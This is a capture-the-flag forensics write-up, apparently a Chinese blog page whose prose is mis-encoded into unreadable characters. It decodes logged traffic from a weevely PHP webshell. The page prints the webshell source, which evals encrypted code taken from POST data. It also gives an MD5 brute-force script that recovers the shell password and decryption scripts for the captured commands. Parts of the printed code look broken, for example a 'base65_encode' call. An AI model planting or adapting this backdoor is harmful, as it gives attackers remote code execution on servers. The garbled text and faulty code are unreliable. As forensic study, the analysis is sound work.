class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">//æœåŠ¡å™¨æœ¨é©¬111.php</span><br><span class="line">&lt;?php</span><br><span class="line">$k = &quot;bd377f17&quot;;</span><br><span class="line">$kh = &quot;9d4cd50b4843&quot;;</span><br><span class="line">$kf = &quot;5bd9ce820932&quot;;</span><br><span class="line">$p = &quot;oOtvNy5TkuOg1fjf&quot;;</span><br><span class="line">function x($t, $k)</span><br><span class="line">&#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 1; $i &lt; $l;) &#123;</span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line">if (@preg_match(&quot;/$kh(.+)$kf/&quot;, @file_get_contents(&quot;php://input&quot;), $m) == 2) &#123;</span><br><span class="line">    @ob_start();</span><br><span class="line">    @eval(@gzuncompress(@x(@base64_decode($m[2]), $k)));</span><br><span class="line">    $o = @ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    $r = @base65_encode(@x(@gzcompress($o), $k));</span><br><span class="line">    print(&quot;$p$kh$r$kf&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//è¯·æ±‚çš„è¯¦ç»†åŒ…</span><br><span class="line">--4b398f30-B--</span><br><span class="line">POST /111.php HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Content-Length: 83</span><br><span class="line">Host: 192.168.12.154</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.9) Gecko/20061215 Red Hat/1.5.0.9-0.1.el4 Firefox/1.5.0.9</span><br><span class="line"></span><br><span class="line">--4b398f30-C--</span><br><span class="line">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6goLPr65AhWAlXS5IY1OHTFYFQ509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span><br><span class="line">--4b398f30-F--</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: PHP/5.4.16</span><br><span class="line">Content-Length: 60</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">--4b398f30-E--</span><br><span class="line">kbPze6iWSynLVEi5a0b923820dccG6hQVAIEgDhjN3RgPg==509a6f75849b</span><br><span class="line">--4b398f30-H--</span><br><span class="line">Apache-Handler: application/x-httpd-php</span><br><span class="line">Stopwatch: 1575448316609856 1233 (- - -)</span><br><span class="line">Stopwatch2: 1575448316609856 1233; combined=36, p1=12, p2=20, p3=1, p4=0, p5=2, sr=0, sw=1, l=0, gc=0</span><br><span class="line">Response-Body-Transformed: Dechunked</span><br><span class="line">Producer: ModSecurity for Apache/2.9.2 (http://www.modsecurity.org/).</span><br><span class="line">Server: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">Engine-Mode: &quot;DETECTION_ONLY&quot;</span><br><span class="line"></span><br><span class="line">--4b398f30-Z--</span><br></pre></td></tr></table></figure><p>ä»”ç»†æ¯”è¾ƒè¿™ä¸¤ä¸ªåŒ…ï¼Œå¯ä»¥å‘ç°ï¼Œå®ƒè¯·æ±‚å’Œè¿”å›ä¿¡æ¯éƒ½å¯¹ä¸ä¸Š  khå’Œkfä»¥åŠpä¸å¯¹åº”ã€‚</p><p>ç»è¿‡æŸ¥çœ‹å¤§å¸ˆå‚…æ–‡ç« å‘ç° å…¶å®è¿™ä¸ªweevelyæœ¨é©¬çš„å¯†ç ä¸ºmd5</p><p>åŸæ–‡<code>https://www.xmsec.cc/weevely3-notes/</code><img src="/images/tiesan/image-20230505194956501.png" alt="image-20230505194956501"></p><p>é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæ²¡æœ‰åŸæœ¨é©¬æ–‡ä»¶ï¼Œå¦‚æœå¯†ç æ˜¯å¼±çš„é‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è§£å¯†</p><p>æˆ‘çœ‹å…ˆçœ‹è‡ªå·±ç”Ÿæˆçš„æœ¨é©¬çš„key</p><figure class="highlight plaintext"><figcaption><span>generate 1 1.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//weevely generate 1 1.php</span><br><span class="line"></span><br><span class="line">&lt;?php $k = &quot;c4ca4238&quot;;</span><br><span class="line">$kh = &quot;a0b923820dcc&quot;;</span><br><span class="line">$kf = &quot;509a6f75849b&quot;;</span><br><span class="line">$p = &quot;FTxlZajQkHqbQYY5&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¯†ç ä¸º1æ—¶ï¼Œk kh kfåˆ†åˆ«ä¸ºè¿™äº›ï¼ŒæŠŠ1è¿›è¡ŒåŠ å¯† md5ä¸ºc4ca4238a0b923820dcc509a6f75849b</p><p><img src="/images/tiesan/image-20230505195338135.png" alt="image-20230505195338135"></p><p>å¯ä»¥ä»”ç»†æ¯”å¯¹ï¼Œä¸­é—´12ä½å’Œæœ€å12ä½ï¼Œä¹Ÿå°±æ˜¯<code>md5(1)=$k+$kh+$kf</code></p><p>åœ¨æ—¥å¿—ä¸­æ‹¿å‡ºå‡ å¯¹ä»”ç»†çœ‹ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">--4b398f30-C--</span><br><span class="line">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6goLPr65AhWAlXS5IY1OHTFYFQ509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span><br><span class="line">--4b398f30-F--</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: PHP/5.4.16</span><br><span class="line">Content-Length: 60</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">--4b398f30-E--</span><br><span class="line">kbPze6iWSynLVEi5a0b923820dccG6hQVAIEgDhjN3RgPg==509a6f75849b</span><br><span class="line">--4b398f30-H--</span><br><span class="line">Apache-Handler: application/x-httpd-php</span><br><span class="line">Stopwatch: 1575448316609856 1233 (- - -)</span><br><span class="line">Stopwatch2: 1575448316609856 1233; combined=36, p1=12, p2=20, p3=1, p4=0, p5=2, sr=0, sw=1, l=0, gc=0</span><br><span class="line">Response-Body-Transformed: Dechunked</span><br><span class="line">Producer: ModSecurity for Apache/2.9.2 (http://www.modsecurity.org/).</span><br><span class="line">Server: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">Engine-Mode: &quot;DETECTION_ONLY&quot;</span><br><span class="line"></span><br><span class="line">--4b398f30-Z--</span><br><span class="line"></span><br><span class="line">--b4e7ac4b-C--</span><br><span class="line">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5xVlRB77cp4NqcyONKnd8Y509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span><br><span class="line">--b4e7ac4b-F--</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: PHP/5.4.16</span><br><span class="line">Content-Length: 88</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">--b4e7ac4b-E--</span><br><span class="line">kbPze6iWSynLVEi5a0b923820dccG6hIrHiDBomzfE8pePx77Td8JIIi16QudxfqETUyTeNsQQ==509a6f75849b</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºè¿™ä¸ª509a6f75849bä¸ºæœ€åçš„ï¼Œä¹Ÿå°±æ˜¯kfäº†ï¼Œa0b923820dccä¸ºä¸­é—´çš„äº†ï¼Œä¸”éƒ½æ˜¯12ä½</p><p>ç»“åˆè¾“å‡º$p$kh$r$kfè¿™å‡ ä¸ªå˜é‡çš„å€¼æ—¶ï¼Œä¹Ÿå°±å¯ä»¥åˆ¤æ–­å‡ºï¼Œè¿™ä¸ªæµé‡åŒ…çš„ä¸€äº›å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$kh = &quot;a0b923820dcc&quot;;</span><br><span class="line">$kf = &quot;509a6f75849b&quot;; </span><br><span class="line">$p = &quot;kbPze6iWSynLVEi5&quot;;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è¿˜å·®ä¸€ä¸ªå˜é‡k ä¹Ÿæ˜¯æœ€é‡è¦çš„å˜é‡ï¼Œå› ä¸ºmd5(1)=$k+$kh+$kfï¼Œæ‰€ä»¥å¦‚æœå¯†ç ä¸å¤æ‚çš„è¯ï¼Œå¯ä»¥åæ¨å¯†ç ,</p><p>è¿™é‡Œç»™ä¸ªç®€å•è„šæœ¬çˆ†ç ´å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">file = open(&quot;D:\\vscodework\\ctf\\tttt\\passwords.txt&quot;,&quot;r&quot;)</span><br><span class="line">file = file.readlines()</span><br><span class="line"></span><br><span class="line">def baopomd5():</span><br><span class="line">    for i in range(len(file)):</span><br><span class="line">        t =  str(file[i]).strip()</span><br><span class="line">        md5_result = hashlib.md5(t.encode(&quot;utf-8&quot;)).hexdigest()</span><br><span class="line">        #print(md5_result)</span><br><span class="line">        if md5_result[8:33] == &#x27;a0b923820dcc509a6f75849b&#x27;:</span><br><span class="line">            print(t)</span><br><span class="line">            print(md5_result)</span><br><span class="line">            break</span><br><span class="line">baopomd5()</span><br><span class="line">//1</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥è·å–åˆ°äº†æœ¨é©¬å¯†ç äº†ã€‚ä¹Ÿå¯ä»¥çŸ¥é“å˜é‡käº†</p><p>å½“ç„¶ï¼Œå¦‚æœæœ‰ç½‘ç»œçš„è¯ï¼Œä¹Ÿå¯ä»¥æ‹¿ç€a0b923820dcc509a6f75849bè¿™ä¸ªå»cmd5æŸ¥ä¸€ä¸‹</p><p><img src="/images/tiesan/image-20230505202525359.png" alt="image-20230505202525359"></p><p>flag PUT 1</p><h4 id="8-10"><a href="#8-10" class="headerlink" title="8-10"></a>8-10</h4><p>å› ä¸ºå¤ªèœäº†ï¼Œç°åœºä¸­å¹¶æ²¡æœ‰åšå‡ºæ¥åé¢çš„ï¼Œæ‰€ä»¥å¹¶ä¸çŸ¥åˆ°é¢˜ç›®æ˜¯ä»€ä¹ˆï¼Œä¸è¿‡æ²¡å…³ç³»ï¼Œæˆ‘ä»¬æŠŠæ‰€æœ‰çš„æµé‡éƒ½ç»™ä»–è§£å‡ºæ¥ï¼Œè¿™æ ·ä»–é—®ä»€ä¹ˆï¼Œæˆ‘ä»¬éƒ½æ˜¯çŸ¥é“çš„ï¼Œ</p><p>æŸ¥é˜…å…¶ä»–å¤§å¸ˆå‚…æ–‡ç« ï¼Œ<code>https://artikrh.sh/posts/weevely-backdoor-analysis.html</code>å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œå¯ä»¥å¾—å‡ºè§£å¯†è„šæœ¬ï¼Œè¿™é‡Œå°†åæ¨å‡ºæ¥çš„k på•¥çš„å†™ä¸Šå³å¯ï¼ŒæŠŠphpinfoæ›¿æ¢ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;c4ca4238&quot;</span>; <span class="comment">// FIRST PART: 8 first chars</span></span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;a0b923820dcc&quot;</span>; <span class="comment">// SECOND PART: 12 next chars</span></span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;509a6f75849b&quot;</span>; <span class="comment">// THIRD PART: 12 last chars</span></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;kbPze6iWSynLVEi5&quot;</span>; <span class="comment">// Random data (?)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123; <span class="comment">// XOR</span></span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">              <span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phpinput</span> = <span class="string">&quot;kbPze6iWSynLVEi5a0b923820dccG6iwTn8e4RdMG7SuHPv+OWMVTWXF509a6f75849b</span></span><br><span class="line"><span class="string">&quot;</span>; <span class="comment">// HTTP POST data  //æ›¿æ¢æ•°æ®å³å¯</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, <span class="variable">$phpinput</span>, <span class="variable">$m</span>) == <span class="number">1</span>) &#123; <span class="comment">// if $kh and $kf exist in php://input, store matches in array $m; if debugged with print_r($m) you will notice that $m[0] is $kh + b64data + $kf and $m[1] is b64data only</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$phpcode</span> = @gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>)); <span class="comment">// gunzip(XOR(b64decode(data), key))</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$phpcode</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    <span class="doctag">@ob</span>_start(); // Turn on output buffering</span></span><br><span class="line"><span class="comment">    <span class="doctag">@eval</span>($phpcode); // Executes PHP code</span></span><br><span class="line"><span class="comment">    $o = <span class="doctag">@ob</span>_get_contents(); // Save stdout to $o</span></span><br><span class="line"><span class="comment">    <span class="doctag">@ob</span>_end_clean(); // Clean (erase) the output buffer and turn off output buffering</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    $r = <span class="doctag">@base</span>64_encode(<span class="doctag">@x</span>(<span class="doctag">@gzcompress</span>($o), $k)); // b64encode(XOR(gzip(stdout)), key)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    print(&quot;$p$kh$r$kf&quot;); // HTTP Response data</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªè„šæœ¬ï¼Œå…ˆå°†æ‰€æœ‰ç›¸å…³çš„éƒ½æå‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = a.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;zYgIi?&#123;4d\&gt;;=h&#x27;=&quot;</span> <span class="keyword">in</span> a[i]:</span><br><span class="line">        <span class="built_in">print</span>(a[i])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;kbPze6iWSynLVEi5&quot;</span> <span class="keyword">in</span> a[i]:</span><br><span class="line">        <span class="built_in">print</span>(a[i])</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>è¿™è¾¹ä¸ºäº†æ–¹ä¾¿ç›´æ¥è§£é™¤æ‰€æœ‰çš„å†…å®¹```</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;c4ca4238&quot;</span>; <span class="comment">// FIRST PART: 8 first chars</span></span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;a0b923820dcc&quot;</span>; <span class="comment">// SECOND PART: 12 next chars</span></span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;509a6f75849b&quot;</span>; <span class="comment">// THIRD PART: 12 last chars</span></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;kbPze6iWSynLVEi5&quot;</span>; <span class="comment">// Random data (?)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// $k=c4ca4238</span></span><br><span class="line"><span class="comment">// p=kbPze6iWSynLVEi5   kh=a0b923820dcc   r=G6hIr/gf+3FmNGpnNrk=  kf=509a6f75849b</span></span><br><span class="line"><span class="comment">// User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.9) Gecko/20061215 Red Hat/1.5.0.9-0.1.el4 Firefox/1.5.0.9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --009f0c02-C--</span></span><br><span class="line"><span class="comment">// zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gQKRkY+RfpGylM/B0Z8a9/tFHkhh0QqfhIsER6fBWq/ExP/Xn/dbbkt9UyMmTZbH0509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="comment">//   p kh</span></span><br><span class="line"><span class="comment">// kbPze6iWSynLVEi5a0b923820dccG6hIr/gf+3FmNGpnNrk=509a6f75849b</span></span><br><span class="line"><span class="comment">// p=kbPze6iWSynLVEi5   kh=a0b923820dcc   r=G6hIr/gf+3FmNGpnNrk=  kf=509a6f75849b</span></span><br><span class="line"><span class="comment">//1 c4ca4238a0b923820dcc509a6f75849b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123; <span class="comment">// XOR</span></span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">              <span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phpinput</span> = <span class="string">&quot;zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6goLPr65AhWAlXS5IY1OHTFYFQ509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hQVAIEgDhjN3RgPg==509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gQKRkY+RfpGylM/B0Z8a9/tFHkhkUQzRhNKPnnY3cu+qs2BIOHiFNntNUyMn84bsU509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hQ0ICCA9thNGc4NSw=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gQKRkY+RfpGylM/B0Z8a9/tFHkhh0QqfhIsER6fBWq/ExP/Xn/dbbkt9UyMmTZbH0509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hIr/gf+3FmNGpnNrk=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gO7HU48BhzcUxCRe5GF2bbMuvsRCE+z/6L1bXQ7rONNrqfwyzsGRBSrDkGBXkjP7jGdJzIVLBSCEHjGovh1lRYhkrA4FVhrQUtC0p4nda7tFgpVNS6qooe2ogg7JvX1VfPWYITlTcLnavyLek4awkX0Zw7+m154g509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6goTXx+/XBmNGs/NlE=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gQKRkY+RfpGylM/B0Z8a9/tFHkhkVwrXyqTeZi5Gu0YDBKHPj/E7JEKy4Zex13suS31TIyjOdzvw509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6iwTn8e4RdMG7SuHPv+OWMVTWXF509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5xVlRB77cp4NqcyONKnd8Y509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hIrHiDBomzfE8pePx77Td8JIIi16QudxfqETUyTeNsQQ==509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5yl1R2FkkmJEhgr4cotYXQ3Mg9sdao509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span 